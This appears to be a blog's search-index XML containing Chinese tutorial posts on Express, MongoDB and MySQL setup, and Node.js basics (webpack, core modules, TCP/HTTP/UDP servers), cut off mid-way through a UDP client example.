<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>express</title>
    <link href="/2022/11/07/express/"/>
    <url>/2022/11/07/express/</url>
    
    <content type="html"><![CDATA[<h1 id="Express"><a href="#Express" class="headerlink" title="Express"></a>Express</h1><p>express是基于http封装出来的，极大提升了我们服务端的开发进度</p><p>使用： 安装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install express@版本号</span><br></pre></td></tr></table></figure><p>然后新建一个index.js文件</p><p>进行监听get请求：</p><p>请求之后使用send发送信息给客户端</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">const express = require(&#x27;express&#x27;)</span><br><span class="line"></span><br><span class="line">const app = new express()</span><br><span class="line"></span><br><span class="line">const port = 3000</span><br><span class="line"></span><br><span class="line">app.get(&#x27;/&#x27;, (req, res)=&gt;&#123;</span><br><span class="line">    res.send(&#x27;hello world!&#x27;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.listen(port, ()=&gt;&#123;</span><br><span class="line">    console.log(&#x27;listen port 3000&#x27;);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>我们发现这些方法的使用和原生的http模块其实很类似</p><p>send方法响应一个字符串，也可以响应一个json对象</p><h2 id="1-常用api"><a href="#1-常用api" class="headerlink" title="1.常用api"></a>1.常用api</h2><h3 id="1-1-static"><a href="#1-1-static" class="headerlink" title="1.1 static"></a>1.1 static</h3><p>将静态资源向外展示，现在将public中的资源向外开放</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// 向外展示静态资源</span><br><span class="line">// static中的便是需要展示的文件夹</span><br><span class="line">app.use(express.static(&#x27;public&#x27;))</span><br></pre></td></tr></table></figure><p>但是我们访问public下的资源时不需要加<code>/public</code></p><p>而是直接使用public下的相对路径就可以了</p><h3 id="1-2-nodemon"><a href="#1-2-nodemon" class="headerlink" title="1.2 nodemon"></a>1.2 nodemon</h3><p>一个类似于热重载的插件</p><p><code>npm install -g nodemon</code>全局安装nodemon</p><p>安装完毕之后 使用<code>nodemon 文件名</code>启动项目</p><p>之后每次代码变动，只要ctrl+s就会自动重载代码</p>]]></content>
    
    
    
    <tags>
      
      <tag>node.js</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>some sql</title>
    <link href="/2022/11/01/some%20sql/"/>
    <url>/2022/11/01/some%20sql/</url>
    
    <content type="html"><![CDATA[<h1 id="一、NoSql"><a href="#一、NoSql" class="headerlink" title="一、NoSql"></a>一、NoSql</h1><p>nosql代表的是 （not only sql）是一种非关系型数据库，比较于关系型数据库，这种数据库的数据存储量更大，更利用应用和数据分析</p><p>比如Facebook等对于用户喜好等分析就是使用的这种数据库</p><p>非关系型数据不适合存储在数据表的行和列中，而是大块组合在一起。非关系型数据通常存储在数据集中，就像文档、键值对或者图结构。</p><p><strong>实例–&gt;数据库–&gt;集合(collection)–&gt;键值对(key-value)</strong></p><p>而这种数据库的代表就是MongoDB</p><h2 id="MongoDB："><a href="#MongoDB：" class="headerlink" title="MongoDB："></a>MongoDB：</h2><p>安装的话，按照正常的教程安装就好了，我这里选择了安装compass（一个可视化的数据库管理页面）</p><p>安装完成之后启动：</p><p>在MongoDB安装目录下的bin文件中打开cmd命令行，或者直接通过cmd命令输入安装目录下的bin文件，<br>进入安装目录后输入mongod –dbpath=../data –port=27017(后面的数字是你的端口号)。这里是必须要进入data文件中。</p><p>启动之后打开compass，点击connect就可以连接到数据库了</p><h1 id="二、Sql"><a href="#二、Sql" class="headerlink" title="二、Sql"></a>二、Sql</h1><p>常规的数据库也就是关系型数据库，关系型数据库更有标准化的结构</p><h2 id="mysql"><a href="#mysql" class="headerlink" title="mysql:"></a>mysql:</h2><p>最经典的sql数据库，安装之后默认在3306端口上</p><p>初始化数据库：</p><p>cmd 输入：<code>mysqld --initialize --console</code>，初始化数据库服务，生成data文件</p><p>输入<code>mysqld --install</code>将mysql加入系统服务中</p><p>在cmd（管理员）中打开 输入<code>net start mysql</code> 代表开启数据库服务</p><p>这个时候输入<code>mysql -u root -p</code></p><p>再输入密码，进入<code>mysql shell</code></p>]]></content>
    
    
    
    <tags>
      
      <tag>数据库</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>node.js</title>
    <link href="/2022/10/27/node.js/"/>
    <url>/2022/10/27/node.js/</url>
    
    <content type="html"><![CDATA[<h1 id="Node-js"><a href="#Node-js" class="headerlink" title="Node.js"></a>Node.js</h1><p>学习这门技术的很早之前我就知道了node，npm，js。js作为一门编程语言，难道只能用于前端吗？node这门技术到底是为了什么产生的呢？</p><p>定义：Node.js是一个基于Chrome V8引擎的JS运行环境</p><p>人话就是：node提供了js实现后端的api</p><p>就像浏览器提供了js前端实现的api（我们是dom和bom）</p><p>node提供了js能实现系统级代码的api</p><p>跳过亿点js基础…</p><h2 id="1-webpack构建node框架"><a href="#1-webpack构建node框架" class="headerlink" title="1.webpack构建node框架"></a>1.webpack构建node框架</h2><p>第一步创建一个目录</p><p>并进入到该目录下，进行初始化项目操作，<code>-y</code>代表使用默认配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm init -y</span><br></pre></td></tr></table></figure><p>回车，然后我们发现生成了package.json的配置文件，记录了项目的配置信息</p><p>安装webpack</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install webpack webpack-cli --save-dev</span><br></pre></td></tr></table></figure><p>webpack-cli实现命令行支持webpack</p><p><code>--save-dev</code>实现在package中设置依赖项</p><h3 id="1-1-目录结构"><a href="#1-1-目录结构" class="headerlink" title="1.1  目录结构"></a>1.1  目录结构</h3><p><code>node_modules</code>：存放了npm 安装的各种开发包</p><p><code>package-lock.json</code>：锁定安装依赖的小版本号</p><p><code>package.json</code>：大版本信息</p><h3 id="1-2-第一个node"><a href="#1-2-第一个node" class="headerlink" title="1.2 第一个node"></a>1.2 第一个node</h3><p>新建src文件夹</p><p>新建一个index.html和index.js</p><p><strong>将index.js放入src下！！！</strong></p><p>不然后面webpack打包会报错</p><p>在index.js中写入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.write(&quot;hello node!&quot;);</span><br></pre></td></tr></table></figure><p>然后在index.html 中引入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;./index.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>运行html之后我们得到打印出来的hello</p><p><strong>webpack优化</strong>:</p><p>虽然运行了node项目，但是我们没有用到webpack</p><p>新建dist目录，将index.html 放入，dist目录下的是显示给用户的页面，会更加简洁，更加优化</p><p>为了做到这样我们先安装Lodash，将write转换成标签（div）插入文本的方式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save lodash</span><br></pre></td></tr></table></figure><p>然后我们就可以更改我们index.js中的代码</p><p><code>createElement</code>创建节点</p><p><code>join</code> 给节点inner添加数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import _ from &#x27;lodash&#x27;;</span><br><span class="line"></span><br><span class="line">function addDiv() &#123;</span><br><span class="line">    //创建一个div节点</span><br><span class="line">    let eleDiv = document.createElement(&quot;div&quot;);</span><br><span class="line">    //在创建的节点中输入内容</span><br><span class="line">    eleDiv.innerHTML = _.join([&#x27;hello webpack!&#x27;])</span><br><span class="line">    //返回这个节点</span><br><span class="line">    return eleDiv</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//将这个div作为body的孩子加入</span><br><span class="line">document.body.appendChild(addDiv());</span><br></pre></td></tr></table></figure><p>然后使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx webpack</span><br></pre></td></tr></table></figure><p>打包之后得到main.js文件，也就是更轻量级的优化后的index.js</p><h3 id="1-3-一些配置"><a href="#1-3-一些配置" class="headerlink" title="1.3  一些配置"></a>1.3  一些配置</h3><p>新建一个<code>webpack.config.js</code> 用于进行webpack的基本配置，相当于代替了一些shell命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">const path = require(&#x27;path&#x27;)</span><br><span class="line"></span><br><span class="line">module.exports = &#123;</span><br><span class="line">    // 以后就从这个文件开始打包</span><br><span class="line">    entry: &#x27;./src/index.js&#x27;,</span><br><span class="line">    output: &#123;</span><br><span class="line">        //出口文件名</span><br><span class="line">        filename: &#x27;bundle.js&#x27;,</span><br><span class="line">        //出口文件路径</span><br><span class="line">        path: path.resolve(__dirname, &#x27;dist&#x27;),</span><br><span class="line">    &#125;,</span><br><span class="line">    //打包模式</span><br><span class="line">    mode: &#x27;development&#x27;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>然后在package.json中script中加入</p><p><code>&quot;build&quot;:&quot;webpack&quot;</code>，然后我们使用<code>npm run build</code>就可以实现webpack打包操作</p><p>如果嫌弃每次加载都需要执行run build</p><p>我们就下载webpack-dev-serve</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install webpack-dev-server --save-dev</span><br></pre></td></tr></table></figure><p>然后在package.json 的scripts中加入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;dev&quot;: &quot;webpack-dev-server&quot;</span><br></pre></td></tr></table></figure><p>然后使用npm run dev开启热加载，就像vue的<code>npm run serve</code></p><p>如果出现了not get的情况</p><p>试试在package.json中加入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//server配置</span><br><span class="line">devServer: &#123;</span><br><span class="line">    static:&quot;./src&quot;,</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><h2 id="2-node语法"><a href="#2-node语法" class="headerlink" title="2.node语法"></a>2.node语法</h2><p>node 的控制台交互环境叫REPL</p><h3 id="2-1-控制台（console）"><a href="#2-1-控制台（console）" class="headerlink" title="2.1 控制台（console）"></a>2.1 控制台（console）</h3><p>在cmd中输入node可以进入node控制台，console中有一些方法</p><p>首先是我们熟知的log()</p><p>打印一些数据，就像print</p><p>然后是info，warn，error</p><p>和log()类似，但是在浏览器中的效果不同</p><p>dir()：输出一个对象的信息</p><p>time timeEnd：是一对操作 time开头，timeEnd结尾</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">console.time(&#x27;time1&#x27;);</span><br><span class="line">for()&#123;---&#125;</span><br><span class="line">console.timeEnd(&#x27;time1&#x27;);</span><br></pre></td></tr></table></figure><p>输入node time 可以查看time1所包裹的这段时间的长度</p><p>trace：输出当前位置的栈信息</p><h3 id="2-2-包管理"><a href="#2-2-包管理" class="headerlink" title="2.2 包管理"></a>2.2 包管理</h3><h4 id="2-2-1-npm"><a href="#2-2-1-npm" class="headerlink" title="2.2.1 npm"></a>2.2.1 npm</h4><p>npm -v查看版本信息</p><p>npm init 初始化出来一个package.json文件</p><p>npm install 会执行安装包的命令，生成node_modules，对于特定的安装包 在其后添加 –save 可以添加到package的依赖中去</p><h4 id="2-2-2-模块加载"><a href="#2-2-2-模块加载" class="headerlink" title="2.2.2 模块加载"></a>2.2.2 模块加载</h4><p>使用require实现模块加载</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const http = require(&quot;http&quot;);</span><br></pre></td></tr></table></figure><p>使用export导出模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">module.exports = xxx;</span><br></pre></td></tr></table></figure><h3 id="2-3-核心模块"><a href="#2-3-核心模块" class="headerlink" title="2.3 核心模块"></a>2.3 核心模块</h3><p>http模块：</p><p>server中有两个参数 req和res</p><p>res可以通过writeHead函数写响应头部信息：content-type表示让浏览器以什么去<strong>解释传过来的内容</strong></p><p>‘text/plain’表示以纯文本解释</p><p>‘text/html’就代表会用html格式解析，用于传输一些html代码</p><p>服务器的res中有三个事件，都可以通过<code>res.on(&#39;事件名&#39;, function()&#123;&#125;)</code>调用</p><p>data 请求体来到时触发，提供一个chunk，表示接收到的数据</p><p>end 请求体数据传输完毕时候触发，其中函数res.end(xxx)，就是给页面返回内容</p><p>close 用户请求结束的时候触发</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">//获取http模块</span><br><span class="line">const http = require(&#x27;http&#x27;);</span><br><span class="line">//创建server</span><br><span class="line">const server = http.createServer(function (req, res)&#123;</span><br><span class="line">    res.writeHead(200,&#123;</span><br><span class="line">        &#x27;content-type&#x27;: &#x27;text/plain&#x27;</span><br><span class="line">    &#125;);</span><br><span class="line">    res.end(&#x27;Hello node&#x27;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">//创建监听端口</span><br><span class="line">server.listen(3000, function() &#123;</span><br><span class="line">    console.log(&quot;listening port 3000&quot;);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>这里的createServer相当于是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">const server = new http.Server();</span><br><span class="line">server.on(&#x27;request&#x27;, function(req, res)&#123;&#125;)</span><br></pre></td></tr></table></figure><p>然后我们简单再写一个用户请求的代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">const http = require(&#x27;http&#x27;);</span><br><span class="line">let reqData = &#x27;&#x27;;</span><br><span class="line">http.get(&#123;</span><br><span class="line">    &#x27;host&#x27;: &#x27;127.0.0.1&#x27;,</span><br><span class="line">    &#x27;port&#x27;: &#x27;3000&#x27;</span><br><span class="line">&#125;,function (res) &#123;</span><br><span class="line">    //返回数据拼接</span><br><span class="line">    res.on(&#x27;data&#x27;,chunk =&gt;&#123;</span><br><span class="line">        reqData += chunk</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    res.on(&#x27;end&#x27;,function () &#123;</span><br><span class="line">        console.log(reqData);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;).end()</span><br></pre></td></tr></table></figure><p>url模块：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const url = require(&#x27;url&#x27;)</span><br></pre></td></tr></table></figure><p>有三个方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url.parse(&#x27;完整的url&#x27;)=&gt;解析后</span><br><span class="line">url.format(&#x27;解析之后的url&#x27;)</span><br><span class="line">url.resolve(&#x27;不完整的url&#x27;)=&gt;得到完整的url</span><br></pre></td></tr></table></figure><p>querystring模块：</p><p>也是通过require引入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//主要方法</span><br><span class="line">querystring.parse();//类似JSON.parse</span><br><span class="line">querystring.stringify();//类似JSON.stringify</span><br></pre></td></tr></table></figure><p>尝试一下，这个模块是对查询字符串进行操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">const querystring = require(&#x27;querystring&#x27;);</span><br><span class="line">let str = &#x27;KeyWord = node.js&amp;name = huruji&#x27;;</span><br><span class="line">let obj = querystring.parse(str);</span><br><span class="line">console.log(obj);</span><br><span class="line"></span><br><span class="line">//得到一个对象</span><br><span class="line">[Object: null prototype] &#123; &#x27;KeyWord &#x27;: &#x27; node.js&#x27;, name: &#x27;huruji&#x27; &#125;</span><br></pre></td></tr></table></figure><h3 id="2-4常用模块"><a href="#2-4常用模块" class="headerlink" title="2.4常用模块"></a>2.4常用模块</h3><h4 id="2-4-1-util"><a href="#2-4-1-util" class="headerlink" title="2.4.1 util"></a>2.4.1 util</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">util.inspect()//写成反序列化的字符串</span><br><span class="line">util.format()//返回可以使用占位符的字符串，像c语言的printf</span><br><span class="line">util.log()//类似console.log但是带有时间戳</span><br></pre></td></tr></table></figure><h4 id="2-4-2-path"><a href="#2-4-2-path" class="headerlink" title="2.4.2 path"></a>2.4.2 path</h4><p>提供了一系列处理文件路径的工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">const path = require(&#x27;path&#x27;);</span><br><span class="line">//dirname是当前文件夹</span><br><span class="line">let outputPath = path.join(__dirname,&#x27;node&#x27;,&#x27;node.js&#x27;)</span><br><span class="line">//显示扩展名</span><br><span class="line">let ext = path.extname(outputPath)</span><br><span class="line">//转成对象形式</span><br><span class="line">let obj = path.parse(outputPath)</span><br><span class="line">//将对象形式转成完整形式</span><br><span class="line">let fpath = path.format(obj)</span><br><span class="line">console.log(outputPath);</span><br><span class="line">console.log(ext);</span><br><span class="line">console.log(obj);</span><br><span class="line">console.log(fpath);</span><br></pre></td></tr></table></figure><p>得到的打印结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">D:\新建文件夹\文件\nodejs\vueproject\src\node\node.js</span><br><span class="line">.js</span><br><span class="line">&#123;</span><br><span class="line">  root: &#x27;D:\\&#x27;,</span><br><span class="line">  dir: &#x27;D:\\新建文件夹\\文件\\nodejs\\vueproject\\src\\node&#x27;,</span><br><span class="line">  base: &#x27;node.js&#x27;,</span><br><span class="line">  ext: &#x27;.js&#x27;,</span><br><span class="line">  name: &#x27;node&#x27;</span><br><span class="line">&#125;</span><br><span class="line">D:\新建文件夹\文件\nodejs\vueproject\src\node\node.js</span><br></pre></td></tr></table></figure><h4 id="2-4-3-dns"><a href="#2-4-3-dns" class="headerlink" title="2.4.3 dns"></a>2.4.3 dns</h4><p>顾名思义就是用于DNS解析的模块</p><p>resolve：解析为一个指定类型的数组</p><p>lookup：返回第一个被发现的地址</p><p>reverse：通过ip解析域名</p><h2 id="3-网络开发"><a href="#3-网络开发" class="headerlink" title="3.网络开发"></a>3.网络开发</h2><p>注意涉及跨域问题的时候，<strong>前后端都要开启跨域允许</strong></p><h3 id="开启跨域"><a href="#开启跨域" class="headerlink" title="开启跨域"></a>开启跨域</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//express框架</span><br><span class="line">res.header(&quot;Access-Control-Allow-Origin&quot;, &#x27;*&#x27;); // 设置允许来自哪里的跨域请求访问（值为*代表允许任何跨域请求，但是没有安全保证）</span><br><span class="line">//http服务器设置跨域</span><br><span class="line">res.setHeader(&quot;Access-Control-Allow-Origin&quot;,&quot;*&quot;);</span><br></pre></td></tr></table></figure><h3 id="3-1-tcp服务器"><a href="#3-1-tcp服务器" class="headerlink" title="3.1 tcp服务器"></a>3.1 tcp服务器</h3><p>首先看看服务器端，主要是创建服务器。还有一些socket的相关事件，比如发送数据获取数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">const net = require(&#x27;net&#x27;);</span><br><span class="line"></span><br><span class="line">//创建服务器</span><br><span class="line">let server = net.createServer(function(socket)&#123;</span><br><span class="line">    console.log(&quot;创建了tcp服务器&quot;);</span><br><span class="line">    //设置最大连接数</span><br><span class="line">    server.maxConnections = 3;</span><br><span class="line">    server.getConnections(function(err, count)&#123;</span><br><span class="line">        console.log(&#x27;链接数量是&#x27;+count);</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    //获取客户端数据</span><br><span class="line">    socket.on(&#x27;data&#x27;,function(data)&#123;</span><br><span class="line">        console.log(data.toString());</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    //发送数据</span><br><span class="line">    let message = &#x27;client the server address is &#x27;+ JSON.stringify(server.address())</span><br><span class="line">    socket.write(message,function()&#123;</span><br><span class="line">        let writeSize = socket.bytesWritten;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">//设置监听端口</span><br><span class="line">server.listen(8081,function () &#123;</span><br><span class="line">    console.log(&#x27;server in listening&#x27;);</span><br><span class="line">&#125;)</span><br><span class="line">//链接时触发</span><br><span class="line">server.on(&#x27;connection&#x27;,function()&#123;</span><br><span class="line">    console.log(&#x27;connect add&#x27;);</span><br><span class="line">&#125;)</span><br><span class="line">//出错时触发</span><br><span class="line">server.on(&#x27;error&#x27;,function()&#123;</span><br><span class="line">    console.log(&#x27;error&#x27;);</span><br><span class="line">&#125;)</span><br><span class="line">//关闭</span><br><span class="line">server.on(&#x27;close&#x27;,function() &#123;</span><br><span class="line">    console.log(&#x27;server close&#x27;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后我们也可以创建服务端</p><p>使用connect链接到服务器的端口</p><p>也是使用write发送数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">const net = require(&#x27;net&#x27;);</span><br><span class="line">//创建客户端</span><br><span class="line">let client = new net.Socket();</span><br><span class="line"></span><br><span class="line">client.connect(8081,&#x27;127.0.0.1&#x27;,function()&#123;</span><br><span class="line">    console.log(&quot;connect the server&quot;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">//发送数据</span><br><span class="line">client.write(&#x27;message from client&#x27;)</span><br><span class="line"></span><br><span class="line">//监听data事件,获取返回数据</span><br><span class="line">client.on(&#x27;data&#x27;,function(data) &#123;</span><br><span class="line">    console.log(&quot;the data is&quot; + data.toString());</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="3-2-http服务器"><a href="#3-2-http服务器" class="headerlink" title="3.2 http服务器"></a>3.2 http服务器</h3><p>设置跨域使用setHeader</p><p>使用我们前面的http模块创建，其实我们之前已经创建过了</p><p>我们现在使用fs模块实现文件的读取</p><p>fs.readFileSync读取文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">//获取http模块</span><br><span class="line">const http = require(&#x27;http&#x27;)</span><br><span class="line">//获取文件读取模块</span><br><span class="line">const fs = require(&#x27;fs&#x27;);</span><br><span class="line">const server = http.createServer(function (req, res) &#123;</span><br><span class="line">    //响应头部书写</span><br><span class="line">    res.writeHead(200, &#123;</span><br><span class="line">        &#x27;content-type&#x27;: &#x27;text/html&#x27;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    var data = fs.readFileSync(&#x27;D:\\新建文件夹\\文件\\nodejs\\vueproject\\dist\\index.html&#x27;)</span><br><span class="line">    //响应数据</span><br><span class="line">    res.write(data)</span><br><span class="line">    res.end();</span><br><span class="line">&#125;)</span><br><span class="line">//读入数据</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">server.listen(3000, function () &#123;</span><br><span class="line">    console.log(&#x27;listening port 3000&#x27;);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>我们还可以根据url中用户请求的不同资源设置不同的<code>content-type</code></p><p>第一 获取文件相对路径</p><p><code>let filePath = &#39;.&#39; + url.parse(req.url).pathname;</code></p><p>用exist检查文件是否存在</p><p>使用<code>extname(filePath)</code>获取扩展名，根据扩展名选择不同的content-type</p><h3 id="3-3-UDP服务器"><a href="#3-3-UDP服务器" class="headerlink" title="3.3 UDP服务器"></a>3.3 UDP服务器</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">const dgram = require(&#x27;dgram&#x27;);</span><br><span class="line"></span><br><span class="line">const socket = dgram.createSocket(&#x27;udp4&#x27;, function (msg, rinfo) &#123;</span><br><span class="line">    socket.on(&#x27;message&#x27;,function (msg, rinfo) &#123;</span><br><span class="line">        console.log(msg.toString());</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">//绑定端口</span><br><span class="line">socket.bind(41234, &#x27;localhost&#x27;,function () &#123;</span><br><span class="line">    console.log(&#x27;bind 41234&#x27;);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>其中我们把rinfo打印出来，发现是传输信息的一些信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; address: &#x27;127.0.0.1&#x27;, family: &#x27;IPv4&#x27;, port: 61547, size: 9 &#125;</span><br></pre></td></tr></table></figure><p>客户端：使用buffer字节传输</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td 